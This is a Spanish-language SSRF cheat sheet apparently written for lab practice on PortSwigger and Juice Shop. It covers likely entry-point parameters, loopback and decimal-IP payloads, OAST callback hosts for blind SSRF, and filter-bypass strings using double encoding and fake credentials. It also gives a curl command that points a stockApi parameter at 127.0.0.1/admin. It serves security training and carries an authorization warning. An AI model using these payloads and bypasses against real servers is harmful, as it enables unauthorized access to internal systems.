<div align="center">

# 📡 SSRF
### Server-Side Request Forgery — Forzado de Requests del Servidor

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-SSRF-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **SSRF:** forzar al servidor a realizar requests HTTP hacia destinos arbitrarios, incluidos sistemas internos normalmente inaccesibles desde el exterior.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Puntos de Entrada](#-puntos-de-entrada) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 06 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 07 | [🧠 Casos Típicos](#-casos-típicos) |
| 08 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 09 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **Juice Shop** | SSRF challenge |
| **PortSwigger** | Server-side request forgery |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-interactsh-a855f7?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `Replay` — modificar parámetros URL |
| **interactsh-client** | OAST — capturar callbacks DNS/HTTP para SSRF ciego |
| **curl** | Reproducción rápida y prueba de payloads |

---

## 🔍 Puntos de Entrada

![Context](https://img.shields.io/badge/Búsqueda-Entry%20Points-ff6b00?style=flat-square)

Parámetros que aceptan URL, host o path:

- `stockApi=`, `imageUrl=`, `webhookUrl=`
- `avatarUrl=`, `fetchUrl=`
- PDF generator / import URL
- URL preview / link unfurl
- Back-end integrations con campo host configurable

> [!TIP]
> Cualquier funcionalidad que cargue recursos externos es candidata. Buscar en `HTTP History` parámetros con valores tipo `http://` o `https://`.

---

## 🧪 Payloads Base

![Context](https://img.shields.io/badge/Payload-Loopback-ff3c6e?style=flat-square)

### `[01]` Loopback básico

```text
http://127.0.0.1/
http://localhost/
http://127.0.0.1/admin
http://2130706433/
http://127.1/
```

### `[02]` OAST — SSRF ciego

```text
https://<token>.oast.site
https://<token>.oastify.com
```

### `[03]` Bypass de filtros en labs

```text
http://127.0.0.1%252fadmin
http://trusted.example@127.0.0.1/
http://127.0.0.1#trusted.example
```

> [!NOTE]
> Los bypasses con encoding doble (`%252f`) o credenciales falsas (`trusted@`) funcionan cuando el servidor valida por regex antes de resolver DNS.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request

Localizar request que acepta URL, host o path como parámetro.

### `[02]` Replay con loopback

Reenviar a `Replay`. Probar:

```text
http://127.0.0.1
http://localhost
```

### `[03]` Comparar respuesta

Evaluar:

- código HTTP diferente
- body con contenido interno
- longitud de respuesta mayor
- tiempo de respuesta diferente

### `[04]` SSRF ciego

Si no hay contenido visible en response:

- levantar `interactsh-client`
- usar endpoint OAST controlado como valor del parámetro
- verificar callback DNS/HTTP recibido

> [!IMPORTANT]
> SSRF ciego no devuelve output directo. La evidencia es el callback externo. Documentar URL usada y timestamp del callback.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-interactsh-a855f7?style=flat-square)

```bash
# Levantar listener OAST
interactsh-client
```

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

```bash
# Probar SSRF básico
curl -i "http://target/product/stock?stockApi=http://127.0.0.1/admin"
```

---

## 🧠 Casos Típicos

| Caso | Señal |
|------|-------|
| **Against server itself** | acceso a `/admin`, `/metrics`, `localhost` |
| **Against internal systems** | puertos internos, metadata cloud, paneles admin |
| **Blind SSRF** | callback DNS/HTTP sin body visible |
| **Redirect bypass** | app sigue redirección a host bloqueado |

---

## 🧭 Ruta de Práctica

1. PortSwigger: basic SSRF against local server
2. PortSwigger: SSRF with blacklist bypass
3. PortSwigger: SSRF with whitelist bypass
4. PortSwigger: blind SSRF with OAST
5. Juice Shop: SSRF challenge

---

## 📝 Checklist

- [ ] parámetro SSRF aislado
- [ ] host interno alcanzable o inferido
- [ ] bypass documentado si filtros activos
- [ ] evidencia OAST guardada si SSRF ciego
